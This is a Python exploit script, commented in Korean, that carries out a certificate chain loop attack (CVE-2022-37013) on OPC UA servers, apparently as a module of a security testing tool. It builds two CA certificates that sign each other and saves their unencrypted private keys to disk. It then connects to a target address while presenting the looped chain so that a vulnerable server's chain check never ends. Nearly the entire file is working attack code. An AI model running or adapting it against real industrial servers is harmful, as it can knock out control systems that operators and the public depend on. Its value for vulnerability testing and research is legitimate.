# Certificate Infinite Chain Loop Attack
#   Some servers implemented the Certificate chain check by themselves and forgot to protect against a chain loop:
#   Example: CertA is signed by CertB which is signed by CertA
# Based on Sector7 idea from Pwn2Own ICS Miami 2022: https://sector7.computest.nl/post/2022-09-unified-automation-opcua-cpp/
#
# Known Affected Servers:
#   - Unified Automation OPC UA C++ Demo Server (UaAnsiServer Cpp) v1.9.2
#
# CVEs:
#  	- CVE-2022-37013: https://www.zerodayinitiative.com/advisories/ZDI-22-1029/
#

import datetime
import os
import tempfile

# pip install asyncua
from asyncua import Client  # OPC UA 클라이언트 라이브러리
import asyncio

# pip install cryptography
from cryptography import x509  # 인증서 생성 라이브러리
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization

# attack 함수는 인증서 체인 루프 공격을 수행하는 함수입니다.
# 이 공격은 특정 OPC UA 서버가 순환하는 인증서 체인을 처리할 때 발생하는 취약점을 노립니다.
# server_details: 서버 세부 정보 (프로그램 타입, IP 주소, 포트 등)
def attack(server_details):
    asyncio.run(attack_impl(server_details))  # 비동기 attack_impl 함수를 호출

# 인증서를 파일로 저장하는 함수
def save_file(name, data):
    with open(name, "wb") as f:
        f.write(data)

# 인증서를 생성하는 함수
def make_cert(name, issuer, public_key, private_key, identifier, issuer_identifier):
    one_day = datetime.timedelta(1, 0, 0)

    builder = x509.CertificateBuilder()
    builder = builder.subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, name)]))  # Subject 이름 설정
    builder = builder.issuer_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, issuer)]))  # Issuer 이름 설정
    builder = builder.not_valid_before(datetime.datetime.today() - (one_day * 7))  # 유효 기간 시작
    builder = builder.not_valid_after(datetime.datetime.today() + (one_day * 90))  # 유효 기간 종료
    builder = builder.serial_number(x509.random_serial_number())  # 랜덤한 일련번호 생성
    builder = builder.public_key(public_key)  # 공개 키 설정
    builder = builder.add_extension(x509.SubjectKeyIdentifier(identifier), critical=False)
    builder = builder.add_extension(x509.AuthorityKeyIdentifier(key_identifier=issuer_identifier, authority_cert_issuer=None, authority_cert_serial_number=None), critical=False)
    builder = builder.add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=False)

    # KeyUsage 확장을 추가하여 다양한 용도로 인증서를 사용할 수 있도록 설정
    builder = builder.add_extension(x509.KeyUsage(
        digital_signature=True, content_commitment=True, key_encipherment=True, data_encipherment=True, 
        key_agreement=True, key_cert_sign=True, crl_sign=True, encipher_only=False, decipher_only=False), 
        critical=False
    )

    # 최종적으로 인증서 서명
    certificate = builder.sign(private_key=private_key, algorithm=hashes.SHA256(), backend=default_backend())
    return certificate  # 생성된 인증서를 반환

# 루프를 가진 인증서 체인을 생성하는 함수
def make_certs_with_chain_loop(save_to="/tmp/"):
    # A 인증서와 B 인증서의 개인 키와 공개 키 생성
    private_keyA = rsa.generate_private_key(public_exponent=65537, key_size=3072, backend=default_backend())
    public_keyA = private_keyA.public_key()

    private_keyB = rsa.generate_private_key(public_exponent=65537, key_size=3072, backend=default_backend())
    public_keyB = private_keyB.public_key()

    # A는 B에 의해 서명되고, B는 A에 의해 서명된 인증서 생성
    certA = make_cert("A", "B", public_keyA, private_keyB, b"1", b"2")
    certB = make_cert("B", "A", public_keyB, private_keyA, b"2", b"1")

    ###### PEM 형식으로 A와 B 인증서 저장 #######
    cert_pem_A = certA.public_bytes(encoding=serialization.Encoding.PEM)
    key_pem_A = private_keyA.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption(),
    )
    save_file(name=os.path.join(save_to, "certA.pem"), data=cert_pem_A)
    save_file(name=os.path.join(save_to, "keyA.pem"), data=key_pem_A)

    cert_pem_B = certB.public_bytes(encoding=serialization.Encoding.PEM)
    key_pem_B = private_keyB.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption(),
    )
    save_file(name=os.path.join(save_to, "certB.pem"), data=cert_pem_B)
    save_file(name=os.path.join(save_to, "keyB.pem"), data=key_pem_B)

    ###### DER 형식으로 A와 B 인증서 저장 #######
    cert_der_A = certA.public_bytes(encoding=serialization.Encoding.DER)
    key_der_A = private_keyA.private_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption(),
    )
    save_file(name=os.path.join(save_to, "certA.der"), data=cert_der_A)
    save_file(name=os.path.join(save_to, "keyA.der"), data=key_der_A)

    cert_der_B = certB.public_bytes(encoding=serialization.Encoding.DER)
    key_der_B = private_keyB.private_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption(),
    )
    save_file(name=os.path.join(save_to, "certB.der"), data=cert_der_B)
    save_file(name=os.path.join(save_to, "keyB.der"), data=key_der_B)

    return certA, certB  # 생성된 A, B 인증서를 반환

# 비동기로 실행되는 attack_impl 함수
async def attack_impl(server_details):
    program_type, ip_addr, port, query_string = server_details

    # 루프를 가진 악성 인증서 준비
    print("[-] Preparing certificates with cross chain loop..")
    temp_dir = tempfile.gettempdir()
    certA, certB = make_certs_with_chain_loop(save_to=temp_dir)
    print(f"[-] Certs saved to: '{temp_dir}'")

    # OPC UA 클라이언트 준비
    print("[-] Preparing client..")
    opcua_uri = f"opc.tcp://{ip_addr}:{port}{query_string}"
    opcua_client = Client(opcua_uri)

    # 클라이언트 보안 설정
    print("[-] Loading client cert..")
    await opcua_client.set_security_string(f"Basic256Sha256,SignAndEncrypt,{temp_dir}/certA.der,{temp_dir}/keyA.der")

    # 인증서 체인 설정
    opcua_client.security_policy.host_certificate = certA.public_bytes(serialization.Encoding.DER) +\
                                                    certB.public_bytes(serialization.Encoding.DER) +\
                                                    certA.public_bytes(serialization.Encoding.DER)
    
    # 악성 인증서를 사용하여 서버에 연결 시도
    print("[-] Connect with malicious certs")
    async with opcua_client:
        children = await opcua_client.nodes.objects.get_children()
        print(f"children: {children}")
